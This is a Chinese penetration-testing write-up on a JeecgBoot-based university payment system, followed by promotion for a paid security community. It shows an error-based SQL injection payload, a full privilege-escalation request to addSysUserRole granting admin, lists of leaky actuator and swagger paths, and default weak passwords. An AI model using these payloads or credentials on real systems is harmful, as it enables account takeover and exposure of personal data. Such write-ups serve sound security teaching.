> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247491678&idx=1&sn=0fb407eb15dc3e950860b1dbc14bb8b1

#  渗透测试 ｜ 从jeecg接口泄露到任意管理员用户接管+SQL注入漏洞  
原创 神农Sec  神农Sec   2025-06-14 01:02  
  
扫码加圈子  
  
获内部资料  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
网络安全领域各种资源，EDUSRC证书站挖掘、红蓝攻防、渗透测试等优质文章，以及工具分享、前沿信息分享、POC、EXP分享。  
不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（知识星球优惠券）。  
#   
  
  
  
**0x1 jeecg框架简介**  
  
  
JeecgBoot是一款基于AIGC、BPM和低代码引擎的AI低代码平台，旨在帮助企业快速实现低代码开发和构建个性化AI应用！前后端分离架构Ant Design&Vue3，SpringBoot，SpringCloud Alibaba，Mybatis-plus，Shiro。强大的代码生成器让前后端代码一键生成，无需写任何代码！ 引领AI低代码开发模式: AI生成->OnlineCoding-> 代码生成-> 手工MERGE， 帮助Java项目解决80%的重复工作，让开发更多关注业务，快速提高效率 节省成本，同时又不失灵活性！低代码能力：Online表单、Online报表、大屏/仪表盘设计、表单设计、流程设计、报表设计;AI能力：AI应用平台+知识库问答、AI模型管理、AI流程编排、AI聊天、AI建表等,支持各种AI大模型ChatGPT、DeepSeek、Ollama等.  
  
  
jeecg官网如下：  

```
https://www.jeecg.com/
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9oTMiaDXgERRQrvLGmHI9KiaEWu6BclpibPDZh21jRXciaAibM6wIn8NhNibw/640?wx_fmt=png&from=appmsg "")  
  
  
  
**0x2 jeecg综合漏洞利用工具**  
  
  
  
这里先给新手师傅们分享个还不错的jeecg漏洞利用工具，首先这个工具书GUI图形化工具，还有就是这个工具更新了很大jeecg的历史nday漏洞在里面，使用操作简单  
  
  
工具下载链接：  
https://github.com/MInggongK/jeecg-  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9VyGZqfbtam7Y9GZlem9b4zmrsSiaH1nc9pBZooWOzxdyGAZSbszcPPw/640?wx_fmt=png&from=appmsg "")  
  
  
  
这里给师傅们演示下，直接把可能存在jeecg漏洞的url导入目标中，然后选择ALL模块，进行检测即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9wSk1Nibyzg9mN2353lLVnpwXGMp9a4Hmcbv0icrplnNfyaNu5ibNr0EVA/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
**0x3 从小程序到web端接口泄露**  
  
  
  
好了，这里废话不多说了，这里回归这次渗透测试项目中来，再次给师傅们分享下这个漏洞，因为有些刚接触网安的师傅还没有接触这个漏洞，所以这里给大家分享下，这次jeecg漏洞通过以前保留的一些jeecg测试手册，一些jeecg的接口和bp数据包，像这样的jeecg框架系统，都是可以直接拿来测试  
  
  
1、首先，这个系统漏洞还是小程序，直接搜索对应资产小程序名称，这个系统是该市里面的一个大学的缴费系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9WicoJ3icLNWJC9nsStX1WVeaZoh6pCjBMlJj58O1sT1KZNKjia1lslqng/640?wx_fmt=png&from=appmsg "")  
  
  
  
2、打开微信小程序，首先我会直接去打开bp抓包，然后这里随便点击里面的功能点，然后进行看里面的数据包  
  
  
然后去翻里面的历史数据包，师傅们可以看到下面的table关键字  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM90jqiccpsq8phL8Ny0mcagCK16WF2OGLq0IEsOyJWM0JAVFbeXUwsH1g/640?wx_fmt=png&from=appmsg "")  
  
  
  
这个tableNane关键字让我感到兴趣，是因为开发人员在一些做接口命名的时候，不会随意取名称，他这个接口后面的tableNane=xxxx，这里我直接去拿table表名出线多的去尝试猜测下  
  
  
这里我尝试了几个，但是都没有出信息，还尝试了information_schema.tables表名，都没有什么数据回显  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM99ZkRpmXicaib5Ij71AvgotBTO49ng20Jiag6QtjzEGelKf5OVX1whQKxg/640?wx_fmt=png&from=appmsg "")  
  
  
  
然后我这里还尝试直接把表名置空，但是依然没有什么敏感数据回显  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9uax0UwQAZqtF4Y6fqSAxqFJXbcA4LeuCDc2bRqjKoXmSUp3fWWEUwg/640?wx_fmt=png&from=appmsg "")  
  
  
3、这里直接把小程序数据包中的host域名和端口，直接放到web端去访问，然后再尝试别的测试  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9WyzjTqNXcQ6bjO008uNgfeEpxe36nnATorZ0lna3fgWZX4Ya4XFCPw/640?wx_fmt=png&from=appmsg "")  
  
  
  
4、这里使用findsomething插件，去跑下web页面泄露的接口，这里把收集到的接口放到一个1.txt的文件中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9rKcQIheHqgYE3OfflibZNndsGHUN7H2uBpkSlASzYqTQTxRjd0hc5xQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
5、这里师傅们要是没有思路，最简单的就是就可以直接把findsomething插件泄露的接口利用bp的POST和GET方法都跑一遍即可。但是这里我需要找找我保存的接口里面有没有泄露跟  
tableName  
相关的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9r31wbEAVgNia0kDzkTfqGzibA2ibGVf9aYtxVxgfPZ5BI1tO2SegzGSvw/640?wx_fmt=png&from=appmsg "")  
  
  
  
6、通过findsomething插件，得到了好几个tableName的接口，然后直接使用bp去访问，发现一个接口直接泄露了四百多个数据表格名称  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9HAmbIuulJsUYnqyRaHfichQXBnNGqksdVk5Jia1xPM6HotCDObol1icvQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
然后每个表里面都泄露了好几百个个人敏感信息，比如身份证、手机号、姓名之类的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9HJk7u8viaK8b5L6yd9RgxykxCohZfdwEguo6OL7iaYjWonLhfEqt4gcA/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
**0x4 SQL注入漏洞**  
  
  
  
这个小程序的一个接口还存在SQL注入漏洞，通过测试，直接可以注入出数据库名称，直接又一个SQL注入到手了  
  

```
SQL注入payload：updatexml(1,concat(0x7e,user(),0x7e),1)
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9RFRLBwta29JNR8LbZnxYDzRhuLEkvicd6muWPlBicqKIIu6X0XezDU9w/640?wx_fmt=png&from=appmsg "")  
  
  
  
**0x5 添加管理员用户**  
  
  
  
师傅们，其实测试到这里，这个系统小程序和web端都摸熟悉了，就是jeecg的系统框架，里面的很多接口都是jeecg开发默认的接口名称，但是前面的路径发生了一点变化，没有原班直接拿jeecg的接口使用，但是经过FUZZ测试出来了很多接口，这里给师傅们分享下，我先注册一个账号，然后提权到admin管理员账号的过程。  
  
  
首先我使用register注册接口，注册一个账号  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9rSgBrTs2nkoV2SekImF2VLX70UdicWEiaI7ekc68MBX36dQEjkRLPmDg/640?wx_fmt=png&from=appmsg "")  
  
  
  
下面就是提权的一个操作了，需要再次FUZZ接口，因为打jeecg漏洞多的师傅们，都知道，jeecg有很多的接口，像什么注册、查信息，查user_id，查所以账号的token值，还有用户敏感信息等，但是现在很多系统都不会直接拿jeecg都路径接口部署了，多多少少会进行魔改  
  
  
这里首先需要查询管理员admin的账户ID  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9WfWPn2VHP0MSSP95JtUhzqW0Tt2kx9nVVgKzlHXPJErmbwfiaI4Nk3g/640?wx_fmt=png&from=appmsg "")  
  
  
  
然后查询自己刚才创建用户的ID值  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9FRpoF89TRHvciaNIhPkCXJcpYQKr8ucPHUuVdpw8UYL0qsiaib5vVoyiaA/640?wx_fmt=png&from=appmsg "")  
  
  
  
然后使用打提权使用的jeecg漏洞poc，如下：  
  
  
//roleld填写需要提权的角色id userldList填写自己的id  
  

```
POST xxxxx/jeecg-boot/sys/user/addSysUserRole（jeecg接口，需要自己去尝试，不一定是我这个） HTTP/1.1
Host: 
Cookie: cna=Ov9SH4RxGiACAf////9C18zb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MjUzNzMyNDMsInVzZXJuYW1lIjoiMTEwMTAyIn0.NXRckymfKdZvEFsDQZ9Jwvk_rU_gVny2Rx6A
Tenant-Id: 0
Origin:
Dnt: 1
Referer: 
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: close
Content-Type: application/json
Content-Length: 96

{
&#34;roleId&#34;:&#34;xxxxxxxxxxx&#34;,
&#34;userIdList&#34;:[
&#34;xxxxxxxxxxxxxxxx&#34;
]

}
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9eVPUhaU1q56Npia6uezsXdbIMhfVAHxAQ3bEiapib1YmQiazBku7S0icEyA/640?wx_fmt=png&from=appmsg "")  
  
  
这样就成功创建了这个系统的admin管理员的账户了，后面的思考就是直接使用创建的账户密码，去尝试爆破登陆其他系统  
  
  
  
**0x6 其他jeecg小技巧**  
  
  
  
下面再给大家总结下jeecg的其他打法小技巧  
  
  
一、常见的接口敏感信息泄露：  
  

```
/v2/api-docs
/swagger-ui.html
/env

//获取参数信息
/actuator
/mappings
/metrics
/beans
/configprops
/actuator/metrics
/actuator/mappings
/actuator/beans
/actuator/configprops
/actuator/httptrace
```

  
二、常见jeecg框架接口关键字：  
  
  
像看到下面的几个关键字，首先需要想到使用jeecg去打，因为很多现在直接把jeecg关键字给魔改了  
  

```
jeecg/

api/sys/

sys/user
```

  
三、jeecg的几个常用弱口令：  
  
  
可以使用下面的弱口令去尝试爆破下登陆接口  
  

```
admin:123456

jeecg:123456
```

##   
  
**0x7 思路总结**  
  
  
  
然后还有很多其他的漏洞，这次文章就不一一给师傅们分享了，留着下次有时候给师傅们分享，这次写这篇文章由于之前的渗透测试项目漏洞都修复 了，我才写的这篇文章，所以实属不易，为了给师傅们演示的那么细致，特意去网上现找了一些漏洞实操截图给师傅们，因为之前的漏洞报告没有写的那么详细，这里怕新手师傅看不懂。  
  
  
这次渗透测试总共提交了四五十个漏洞报告，其中包括很多框架系统的默认弱口令，这个确实让我蛮意外的，还有一些网上的nday，这里面有些老系统也存在，因为测试的资产比较多，所以相对来讲出洞率较高。  
  
  
最后，希望看完这篇文章的你，也可以挖到心仪的漏洞！  
  
  
  
**0x8 内部小圈子详情介绍**  
  
  
  
我们是  
神农安全  
，点赞 + 在看  
 铁铁们点起来，最后祝大家都能心想事成、发大财、行大运。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mngWTkJEOYJDOsevNTXW8ERI6DU2dZSH3Wd1AqGpw29ibCuYsmdMhUraS4MsYwyjuoB8eIFIicvoVuazwCV79t8A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
**圈子专注于更新src/红蓝攻防相关：**  
  

```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
```

  
  
  
  
**内部圈子**  
**专栏介绍**  
  
知识星球内部共享资料截屏详情如下  
  
（只要没有特殊情况，每天都保持更新）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibRSekfPpgmzg6Pn4yH440wEZhQZaJaxJds7olZp5H8Ma4PicQFclzGbQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibgpeLSDuggy2U7TJWF3h7Af8JibBG0jA5fIyaYNUa2ODeG1r5DoOibAXA/640?wx_fmt=png&from=appmsg "")  
  
  
**知识星球——**  
**神农安全**  
  
星球现价   
￥45元  
  
如果你觉得应该加入，就不要犹豫，价格只会上涨，不会下跌  
  
星球人数少于900人 45元/年  
  
星球人数少于1000人 60元/年  
  
（新人优惠卷20，扫码或者私信我即可领取）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUULMWYYicxI1oIZZu1chARoMttntYglBBjtL5tbEeyjQxaibiablKM26xoGibI1Rc1QgOrQbDvia1suXA/640?wx_fmt=png&from=appmsg "")  
  
欢迎加入星球一起交流，券后价仅45元！！！ 即将满900人涨价  
  
长期  
更新，更多的0day/1day漏洞POC/EXP  
  
  
  
**内部知识库--**  
**（持续更新中）**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFu12KTxgSfI69k7BChztff43VObUMsvvLyqsCRYoQnRKg1ibD7A0U3bQ/640?wx_fmt=png&from=appmsg "")  
  
  
**知识库部分大纲目录如下：**  
  
知识库跟  
知识星球联动，基本上每天保持  
更新，满足圈友的需求  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFhXF33IuCNWh4QOXjMyjshticibyeTV3ZmhJeGias5J14egV36UGXvwGSA/640?wx_fmt=png&from=appmsg "")  
  
  
知识库和知识星球有师傅们关注的  
EDUSRC  
和  
CNVD相关内容（内部资料）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFKDNucibvibBty5UMNwpjeq1ToHpicPxpNwvRNj3JzWlz4QT1kbFqEdnaA/640?wx_fmt=png&from=appmsg "")  
  
  
还有网上流出来的各种  
SRC/CTF等课程视频  
  
量大管饱，扫描下面的知识星球二维码加入即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFxYMxoc1ViciafayxiaK0Z26g1kfbVDybCO8R88lqYQvOiaFgQ8fjOJEjxA/640?wx_fmt=png&from=appmsg "")  
  
  
  
不会挖CNVD？不会挖EDURC？不会挖企业SRC？不会打nday和通杀漏洞？  
  
直接加入我们小圈子：  
知识星球+内部圈子交流群+知识库  
  
快来吧！！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJ5wUOL9GnsxoXibKezHTjL6Yvuw6y8nm5ibyL388DdDFvuAtGypahRevg/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJO0FHgdr6ach2iaibDRwicrB3Ct1WWhg9PA0fPw2J1icGjQgKENYDozpVJg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
  
神农安全知识库内部配置很多  
内部工具和资料💾，  
玄机靶场邀请码+EDUSRC邀请码等等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDNtEt0PfMwXQRzn9EDBdibLWNDZXVVjog7wDlAUK1h3Y7OicPQCYaw2eA/640?wx_fmt=png&from=appmsg "")  
  
  
快要护网来临，是不是需要  
护网面试题汇总  
？  
问题+答案（超级详细🔎）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDbLia1oCDxSyuY4j0ooxgqOibabZUDCibIzicM6SL2CMuAAa1Qe4UIRdq1g/640?wx_fmt=png&from=appmsg "")  
  
  
最后，师傅们也是希望找个  
好工作，那么常见的  
渗透测试/安服工程师/驻场面试题目，你值得拥有！！！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDicYew8gfSB3nicq9RFgJIKFG1UWyC6ibgpialR2UZlicW3mOBqVib7SLyDtQ/640?wx_fmt=png&from=appmsg "")  
  
  
内部小圈子——  
圈友反馈  
（  
良心价格  
）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8Hviaqs0Uv6F4NTNkTKDictgOV445RLkia2rFg6s6eYTSaDunVaRF41qBibY1A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8HviaRhLXFayW3gyfu2eQDCicyctmplJfuMicVibquicNB3Bjdt0Ukhp8ib1G5aQ/640?wx_fmt=png&from=appmsg "")  
  
  
****  
**神农安全公开交流群**  
  
有需要的师傅们直接扫描文章二维码加入，然后要是后面群聊二维码扫描加入不了的师傅们，直接扫描文章开头的二维码加我（备注加群）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWUULMWYYicxI1oIZZu1chARofUVubmvPhriajwklmicmPZKTLKSPibIeBqwBWodRribuC1lzZYvOmCkL4w/640?wx_fmt=jpeg&from=appmsg "")  
  
    

```
申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXz4Qht144X0wjJcOMqPwhnh3ptlbTtxDvNMF8NJA6XbDcljZBsibalsVQ/640?wx_fmt=gif "")  
  
  
